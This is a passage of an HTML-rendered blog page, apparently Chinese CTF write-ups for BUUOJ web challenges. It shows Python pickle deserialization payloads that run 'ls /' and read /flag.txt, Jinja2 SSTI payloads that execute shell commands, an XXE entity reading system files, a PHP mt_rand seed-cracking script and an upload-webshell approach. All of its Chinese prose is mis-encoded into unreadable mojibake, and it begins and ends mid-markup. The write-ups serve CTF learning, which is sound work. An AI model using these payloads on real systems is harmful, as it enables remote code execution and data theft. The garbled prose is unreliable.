class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fb27b666-6efb-4d33-9167-72b5c08b84ee.node4.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    urls = url + <span class="built_in">str</span>(i)</span><br><span class="line">    rs=requests.get(urls)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;å·²æ£€æµ‹&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;é¡µ&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> rs.text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;åœ¨&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412224342396.png" alt="image-20230412224342396"></p><p>æœ€åå‘ç°æ˜¯åœ¨ç¬¬180é¡µ</p><p><img src="../images/image-20230412224420291.png" alt="image-20230412224420291"></p><p>å‘ç°é’±ä¸å¤Ÿï¼Œäºæ˜¯æŠ“åŒ…æŸ¥çœ‹ä¸€ä¸‹ï¼Œçœ‹èƒ½ä¸èƒ½ä¿®æ”¹é‡‘é¢</p><p><img src="../images/image-20230412225112765.png" alt="image-20230412225112765"></p><p><img src="../images/image-20230412225054064.png" alt="image-20230412225054064"></p><p>ä¿®æ”¹æŠ˜æ‰£ä¹‹åï¼Œè´­ä¹°æˆåŠŸï¼Œç„¶åè¿”å›ä¸€ä¸ªåœ°å€</p><p><img src="../images/image-20230412225211663.png" alt="image-20230412225211663"></p><p>å‘ç°åªç»™adminç”¨æˆ·è®¿é—®ï¼ŒæŠ“åŒ…çš„æ—¶å€™æˆ‘ä»¬å‘ç°å­˜åœ¨<code>JWT</code>,é‚£ä¹ˆæˆ‘ä»¬çŒœæµ‹æ˜¯ä¿®æ”¹è¿™ä¸ª<code>JWT</code></p><p>ç¬¬ä¸€æ¬¡æ— å¯†ç åŠ å¯†çš„æ—¶å€™å‘ç°ä¸èƒ½æˆåŠŸï¼Œé‚£ä¹ˆå°±çŒœæµ‹è¿™æ˜¯éœ€è¦<strong>å¯†é’¥</strong>æ¥è¿›è¡ŒåŠ å¯†çš„</p><p>äºæ˜¯æˆ‘ä»¬å°±å°è¯•ä½¿ç”¨çˆ†ç ´å·¥å…·</p><p><img src="../images/image-20230412225853104.png" alt="image-20230412225853104"></p><p>çˆ†ç ´å‡ºå¯†é’¥</p><p>å“ªä¹ˆå°±å»<code>jwt.io</code>å°è¯•è¿›è¡Œä¿®æ”¹å€¼</p><p><img src="../images/image-20230412230001862.png" alt="image-20230412230001862"></p><p><img src="../images/image-20230412230025452.png" alt="image-20230412230025452"></p><p>ç™»å½•æˆåŠŸ</p><p><img src="../images/image-20230412230134260.png" alt="image-20230412230134260"></p><p>æŸ¥çœ‹æºç   å‘ç°å­˜åœ¨æºç æ³„éœ²</p><p>æœ€åå‘ç°åœ¨<code>Admin.py</code>æ–‡ä»¶é‡Œå‘ç°æ¼æ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿç‚¹å°±æ˜¯pythonååºåˆ—åŒ–   <strong>pickle  å’Œ   loads</strong>   ä¸¤å…³é”®è¯</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">&#x27;ls /&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span class="line"><span class="built_in">print</span> urllib.quote(pickle.dumps(a))</span><br></pre></td></tr></table></figure><p><strong>è¿™æ˜¯ä½¿ç”¨Ræ“ä½œç è¿›è¡Œæ“ä½œçš„   ç„¶åè¢«ç¦äº†  è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–æ“ä½œç è¿›è¡Œç»•è¿‡</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22<span class="built_in">open</span>%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%2C%27r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412231137498.png" alt="image-20230412231137498"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230413194516104.png" alt="image-20230413194516104"></p><p>ç»™äº†æç¤º</p><p><img src="../images/image-20230413194554347.png" alt="image-20230413194554347"></p><p>å‘ç°æ˜¯jinjia2æ¡†æ¶çš„ssti</p><p><img src="../images/image-20230413194801325.png" alt="image-20230413194801325"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls /flasklight&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯æˆ‘éƒ½æ˜¯ç›´æ¥æ‹¿å­˜ç€çš„æ¨¡æ¿å»æ‰“ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æŒ‰ç…§æ­¥éª¤ä¸€æ­¥ä¸€æ­¥æ¥æ‰“</p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p>é¢˜ç›®</p><p>æŸ¥çœ‹æºç å‘ç°äº†<code>check.php</code>ï¼Œç„¶åè®¿é—®å¾—åˆ°ä¸€æ®µphpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè€ƒç‚¹çš„è¯ä¹‹å‰åšè¿‡äº†ï¼Œç°åœ¨åœ¨é‡æ¸©ä¸€ä¾¿</p><p>å°±æ˜¯è¯´åªè¦<code>mt_srand(seed)</code>çš„<code>seed</code>å›ºå®šï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°éšæœºæ•°çš„å€¼</p><p>æ‰€ä»¥è¯´æˆ‘ä»¬å¾—ä½¿ç”¨å·¥å…·æ¥é€šè¿‡çˆ†ç ´éšæœºæ•°çš„å€¼æ¥çˆ†ç ´å‡ºç§å­ï¼Œä»è€Œå¾—åˆ°æ¥ä¸‹æ¥éšæœºæ•°çš„å€¼</p><p><strong>ç„¶åå†™ä¸ªè„šæœ¬æŠŠç»™çš„å‰åä½å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå·¥å…·èƒ½è¯†åˆ«å‡ºæ¥çš„</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;rlD3S0vhc3&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">// å‰ä¸¤ä¸ª<span class="built_in">str</span>(j)ä»£è¡¨ç¬¬ä¸€ä¸ªmt_rand()è¾“å‡ºçš„ç•Œé™ï¼Œåä¸¤ä¸ªå‚æ•°<span class="number">0</span>å’Œ<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)è¡¨ç¤ºä¼ é€’åˆ° mt_rand()çš„èŒƒå›´ä¸º<span class="number">0</span>åˆ°<span class="number">61</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17 17 0 61 11 11 0 61 39 39 0 61 29 29 0 61 54 54 0 61 26 26 0 61 21 21 0 61 7 7 0 61 2 2 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p>seedçˆ†ç ´å·¥å…·</p><p><a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker</a></p><p><img src="../images/image-20230413202206497.png" alt="image-20230413202206497"></p><p>æ‹¿åˆ°ç§å­</p><p><img src="../images/image-20230413202345933.png" alt="image-20230413202345933"></p><p><img src="../images/image-20230413202336046.png" alt="image-20230413202336046"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230413202626327.png" alt="image-20230413202626327"></p><p>è¿™ç§é¢˜ç›®æœ‰å¥½å¤šåœ°æ–¹éƒ½æ˜¯è€ƒç‚¹</p><p>äºæ˜¯å°±ä¸€ä¸ªä¸€ä¸ªçš„è¿›è¡Œå°è¯•</p><p>æœ€åå‘ç°è¿™é‡Œè€ƒå¯Ÿçš„æ˜¯  <strong>æ–‡ä»¶ä¸Šä¼ </strong></p><p><img src="../images/image-20230413203203320.png" alt="image-20230413203203320"></p><p>è¿™ä¸ªå‡½æ•°åº”è¯¥å¾ˆç†Ÿæ‚‰äº†å§ï¼Œå°±æ˜¯åˆ¤æ–­æ–‡ä»¶å¤´æ˜¯å¦ä¸ºå›¾ç‰‡ç±»å‹</p><p>é‚£æˆ‘å…ˆä¼ å…¥ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œä¸Šä¼ æˆåŠŸã€‚ä½†æ˜¯å‘ç°æ— è®ºæ˜¯.htaccessï¼Œè¿˜æ˜¯å„ç§æ ¼å¼çš„éƒ½æ— æ³•ä¸Šä¼ æˆåŠŸï¼Œå›¾ç‰‡é©¬ä¹Ÿæ— æ³•åˆ©ç”¨ã€‚</p><p>è¿™æ—¶çŒœæµ‹æ˜¯å¦èƒ½é€šè¿‡webåº”ç”¨ç¨‹åºè§£ææ¼æ´ç»•è¿‡ã€‚æŠ¥é”™ç½‘é¡µï¼Œå‘ç°æ˜¯apache</p><p><img src="../images/image-20230413204301391.png" alt="image-20230413204301391"></p><p>éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿è®©ä»–æŠ¥é”™     å‘ç°æ˜¯apacheçš„</p><p><strong>ç”±äºapacheåœ¨è§£ææ–‡ä»¶åçš„æ—¶å€™æ˜¯ä»å³å‘å·¦è¯»ï¼Œå¦‚æœé‡åˆ°ä¸èƒ½è¯†åˆ«çš„æ‰©å±•ååˆ™è·³è¿‡ï¼Œjpgç­‰æ‰©å±•åæ˜¯apacheä¸èƒ½è¯†åˆ«çš„</strong></p><p>è¿™é‡Œçš„è¯å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç«   <a href="https://www.freebuf.com/vuls/335282.html">apacheä¸­é—´ä»¶æ¼æ´è§£ææ€»ç»“</a></p><p><strong>ä½†æ˜¯è¿™é‡Œåˆæ— æ³•ä¸Šä¼ æˆåŠŸï¼Œå¾ˆå¥‡æ€ªã€‚è¿™é‡Œæµ‹è¯•äº†ä¸€ä¼šï¼Œå‘ç°åç€åˆ©ç”¨å°±å¯ä»¥äº†ï¼Œä¸Šä¼ 1.jpg.php</strong></p><p><strong>çœ‹å›¾ç‰‡é“¾æ¥ï¼Œå‘ç°ä¸Šä¼ è·¯å¾„/uploadsã€‚ç„¶åæœ€å¥‡ç‰¹çš„ä¸€ç‚¹ï¼Œjpgå¥½åƒè¢«è¿‡æ»¤æˆç©ºäº†ï¼Œç›´æ¥æ˜¯phpæ–‡ä»¶äº†ã€‚é‚£å°±ç›´æ¥åˆ©ç”¨ã€‚èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag</strong></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230413205529469.png" alt="image-20230413205529469"></p><p>å’Œä¹‹å‰showçš„é¢˜ç›®å¾ˆåƒï¼Œéƒ½æ˜¯é•¿è¿™æ ·çš„</p><p><img src="../images/image-20230413210616742.png" alt="image-20230413210616742"></p><p>æŠ“åŒ…åˆ¤æ–­å‡ºè¿™æ˜¯è€ƒå¯Ÿçš„<code>XXE</code></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [&lt;!ENTITY goodies SYSTEM &quot;file:///proc/net/arp&quot;&gt;]&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ç›´æ¥è¯»flagæ˜¯è¯»ä¸å‡ºæ¥çš„</p><p><strong>ä½†æ˜¯XMLè§£é‡Šå™¨æ”¯æŒå¤šç§åè®®ï¼Œå…¶ä¸­PHPå°±æ”¯æŒhttpå’Œgopherï¼Œæ‰€ä»¥å¯èƒ½flagå­˜åœ¨äºå†…ç½‘ä¸»æœºä¸Šï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡XXEå¯¹å†…ç½‘è¿›è¡Œæ¢æµ‹ã€‚</strong></p><ul><li>/etc/hosts å‚¨å­˜åŸŸåè§£æçš„ç¼“å­˜</li><li>/etc/passwd ç”¨æˆ·å¯†ç </li><li>/proc/net/arp æ¯ä¸ªç½‘ç»œæ¥å£çš„arpè¡¨ä¸­devåŒ…</li></ul><p><strong>/proc/net/arp</strong>    å¯ä»¥ç›´æ¥æŸ¥çœ‹å†…ç½‘ip</p><p><img src="../images/image-20230413212725585.png" alt="image-20230413212725585"></p><p>äºæ˜¯å°±å¼€å§‹çˆ†ç ´å†…ç½‘IPï¼Œå°±æ˜¯æ‰«cæ®µï¼Œç„¶åå°±å¯ä»¥å‘ç°flagäº†</p><p>åŒ¹é…åˆ°æ­£ç¡®çš„ipå°±èƒ½å‘ç°flag</p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>é¢˜ç›®</p><p>æŠ¥é”™æ³¨å…¥</p><p><a href="https://www.cnblogs.com/gaonuoqi/p/12621382.html">wp</a></p><p>è¿™é‡Œè¯æ˜¯è¯å°±æ˜¯é€šè¿‡ä¿®æ”¹å¯†ç å¤„ä¼šè¿›è¡ŒæŠ¥é”™æç¤º</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230415210121161.png" alt="image-20230415210121161"></p><p>ç»™äº†ä¸€ä¸ªç™»å½•æ¡†</p><p><strong>æ¶‰åŠçŸ¥è¯†ç‚¹ ä»»æ„æ–‡ä»¶ä¸‹è½½ã€pharååºåˆ—åŒ–ã€open_basedir</strong></p><p><img src="../images/image-20230415210836408.png" alt="image-20230415210836408"></p><p>éšä¾¿ä¸Šä¼ ä¸€ç‚¹ä¸œè¥¿åï¼Œå¯ä»¥è€ƒè™‘æ˜¯ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç»è¿‡å°è¯•å‘ç°ä¸æ˜¯åï¼Œå¦‚ä½•çœ‹è¿™ä¸ª<strong>ä¸‹è½½</strong>ï¼Œæœ‰ç‚¹æ„Ÿè§‰åƒæ˜¯<strong>æ–‡ä»¶åŒ…å«</strong>ï¼Œäºæ˜¯è¿›è¡ŒæŠ“åŒ…</p><p><img src="../images/image-20230415211021670.png" alt="image-20230415211021670"></p><p>å‘ç°ç¡®å®æ˜¯æ–‡ä»¶åŒ…å«</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p><strong>è€ƒç‚¹</strong></p><p><strong>phpä¼ªåè®®</strong></p><p><strong>äºŒæ¬¡æ³¨å…¥</strong></p><p>äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</p><p><strong>æŸ¥çœ‹æºç å‘ç°æç¤º</strong></p><p><img src="../images/image-20230507212434313.png" alt="image-20230507212434313"></p><p>è¿™é‡Œè¿›è¡Œæ–‡ä»¶çš„è¯»å–çš„è¯ï¼Œå¯ä»¥è€ƒè™‘phpä¼ªåè®®è¿›è¡Œè¯»å–</p><p><img src="../images/image-20230507212605275.png" alt="image-20230507212605275"></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span 